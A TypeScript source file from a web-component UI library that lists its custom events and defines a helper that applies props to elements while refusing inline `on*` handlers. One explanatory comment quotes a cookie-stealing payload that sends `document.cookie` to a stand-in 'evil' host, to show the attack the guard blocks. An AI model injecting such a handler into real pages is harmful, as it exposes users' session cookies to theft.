/**
 * Vanilla-DOM helpers shared by the framework wrappers' `AparteUi` pass-through
 * component. They live in core (zero-dep) so the four wrappers don't each carry
 * a byte-identical copy — only the framework-specific mounting differs.
 */

/**
 * Every custom event an aparté element dispatches on ITSELF — the set `AparteUi`
 * forwards through its single event output, in all four wrappers.
 *
 * `scripts/check-event-map.mjs` asserts this list against every non-`window` dispatch
 * in core.
 *
 * A PLUGIN's events are not here, `aparte-model-change` included. The reason is the
 * same one that keeps plugin tags out of the element registry: this default is core's,
 * and a third-party plugin's author cannot add to it, so listing ours would privilege
 * our packages over theirs. Pass the names you need — `events: ['aparte-model-change']`
 * — which is one line for everyone equally.
 *
 * Three events are deliberately NOT here for a different reason: `aparte-abort`,
 * `aparte-compact` and `aparte-config-change` go out through `window.dispatchEvent` —
 * they concern the whole page, not one subtree — so an element-level listener can never
 * receive them and listing them would promise a forward that cannot happen.
 *
 * The five lifecycle events (including `aparte-message-aborted`) ARE here:
 * `dispatchLifecycleEvent` dispatches them on the HOST ELEMENT, bubbling and composed
 * (`client/lifecycle-events.ts`), and the composer's `window` dispatch is a second,
 * page-wide broadcast, not the only one. The sentence above lists only what a `window`
 * dispatch is the sole path for.
 */
export const APARTE_DEFAULT_UI_EVENTS = [
    // <aparte-composer> and its parts
    'aparte-send',
    'aparte-cancel',
    'aparte-composer-change',
    'aparte-composer-submit',
    'aparte-action-click',
    'aparte-attachment-preview',
    // <aparte-chat-bubble>
    'aparte-action',
    'aparte-retry',
    'aparte-edit',
    'aparte-feedback',
    'aparte-message-info',
    'aparte-branch-navigate',
    'aparte-link-click',
    // <aparte-chat-viewport>
    'aparte-segment-update',
    'aparte-reset-done',
    'aparte-path-changed',
    // <aparte-conversation-list>
    'aparte-conversation-select',
    'aparte-conversation-delete',
    'aparte-conversation-archive',
    'aparte-conversation-unarchive',
    'aparte-conversation-rename',
    'aparte-conversation-pin',
    'aparte-conversation-unpin',
    // The conversation controller, on the chat host: a conversation's messages are on screen.
    'aparte-conversation-loaded',
    // the select primitives
    'aparte-select-change',
    'aparte-select-open',
    'aparte-select-close',
    'aparte-optgroup-toggle',
    // the shell and the transcript's own elements — the five the sweep found missing
    'aparte-suggestion',
    'aparte-context-threshold',
    'aparte-scroll-rail-jump',
    'aparte-sidebar-toggle',
    'aparte-split-resize',
    'aparte-launcher-toggle',
    // the turn's lifecycle, dispatched on the HOST element by `dispatchLifecycleEvent`
    'aparte-message-start',
    'aparte-message-done',
    'aparte-message-error',
    'aparte-message-aborted',
    'aparte-message-paused',
    'aparte-message-resumed',
    'aparte-tool-approval-request',
] as const satisfies readonly string[];

/**
 * Every event name aparté dispatches ON an element, as a type.
 *
 * `as const` rather than `readonly string[]` because a TYPE needs the literals: the
 * Svelte wrapper derives its `on:` surface from `HTMLElementEventMap`, which
 * deliberately omits the five detail-less events (a map entry would type `e.detail` as
 * `null` and gain nothing). Because the wrapper declares the tags, which removes
 * `SvelteHTMLElements`' catch-all index signature, `on:aparte-cancel` — the stop
 * button — only type-checks if it is listed. This list knows those five, so it is the
 * source for "every event you can listen for".
 */
export type AparteUiEventName = typeof APARTE_DEFAULT_UI_EVENTS[number];

/**
 * Apply props to an aparté custom element. aparté elements are
 * **attribute-driven** (`observedAttributes`): assigning a property is either a
 * silent no-op (nothing observes it) or throws outright on a getter-only
 * accessor — `<aparte-composer>`'s `placeholder`/`disabled` are exactly that.
 * So primitives go through `setAttribute`; only values an attribute cannot carry
 * (objects, functions) are handed over as properties. Keys starting with `--`
 * become CSS variables; `on…` function values are ignored (event forwarding is
 * the wrapper's job).
 *
 * `transformValue` is applied to object/function values before they're set as
 * properties — Vue passes `toRaw` to unwrap its reactive proxy (a deep proxy
 * breaks Maps/class internals on a plain custom element); it defaults to identity.
 */
export function applyElementProps(
    el: HTMLElement,
    props: Record<string, unknown>,
    transformValue: (value: unknown) => unknown = (value) => value,
): void {
    for (const [key, value] of Object.entries(props)) {
        if (key.startsWith('--')) {
            /*
             * `null` / `undefined` REMOVE the property; they are not stringified.
             *
             * `props={{ '--aparte-select-bg': theme.selectBg }}` with the field undefined
             * would set the custom property to the token `undefined`. That is strictly worse
             * than not setting it: because the property would be SET, every
             * `var(--aparte-select-bg, <default>)` in core's stylesheet skips its
             * fallback and becomes invalid at computed-value time, so the declaration is
             * dropped entirely and the control renders unstyled rather than with the
             * theme default. An object came out as `[object Object]` the same way.
             *
             * Every other branch of this function removes on null/undefined/false too, and
             * consumers spread arbitrary prop bags in here.
             */
            if (value === null || value === undefined) el.style.removeProperty(key);
            else if (typeof value === 'object' || typeof value === 'function') el.style.removeProperty(key);
            else el.style.setProperty(key, String(value));
        } else if (key.toLowerCase().startsWith('on')) {
            // `toLowerCase()` and not `startsWith('on')`, because an attribute NAME is
            // case-insensitive: `setAttribute('ONCLICK', …)` writes the same `onclick`
            // this branch refuses, so the lowercase-only guard was no guard at all
            // against a key spelled `ONCLICK` or `Onmouseover`. Same idiom as
            // `config/sanitize.ts`. Scoped to this branch on purpose — the `--` branch
            // above must keep the original key, since a CSS custom property IS
            // case-sensitive and `--aparteFoo` is not `--apartefoo`.
            //
            // Event handlers belong on the wrapper's event forwarding, not here —
            // and this drops them WHATEVER their type.
            //
            // No `typeof value === 'function'` condition: that would let a
            // STRING through to `setAttribute` at the bottom of this chain, and
            // `{ onclick: 'fetch("//evil/?"+document.cookie)' }` would become a live
            // inline handler. Consumers spread arbitrary prop bags into
            // `<AparteUi>` (React and Angular both), so those keys are not
            // necessarily authored by the app.
            //
            // Ignoring a string costs a consumer nothing, because an `on*` string is
            // not a working way to attach a listener here.
            el.removeAttribute(key);
        } else if (value === null || value === undefined || value === false) {
            el.removeAttribute(key);
        } else if (typeof value === 'number' && Number.isNaN(value)) {
            /*
             * `NaN` removes the attribute rather than writing the string "NaN".
             *
             * Angular's `numberAttribute` returns `NaN` for undefined, null, '' and any
             * non-numeric expression, so `[scrollThreshold]="cfg.threshold"` with the
             * field unset wrote `scroll-threshold="NaN"`. Core's own fallbacks could not
             * recover: `parseInt('NaN' || '50', 10)` is NaN because `'NaN'` is truthy, so
             * `_isAtBottom()` (`… <= NaN`) stayed false forever — the transcript stopped
             * following a streaming reply and the scroll-to-bottom button never hid.
             * `<aparte-progress-spinner [value]="pct">` with `pct` unset became a
             * determinate ring frozen at 0% where the docblock promises the spinner.
             *
             * Removing it puts the element back on the default it documents, which is
             * what the binding meant. Nothing in the type system can catch this: the
             * generated directive emits `ngAcceptInputType_*: unknown`.
             */
            el.removeAttribute(key);
        } else if (value === true) {
            el.setAttribute(key, '');
        } else if (typeof value === 'object' || typeof value === 'function') {
            (el as unknown as Record<string, unknown>)[key] = transformValue(value);
        } else {
            el.setAttribute(key, String(value));
        }
    }
}
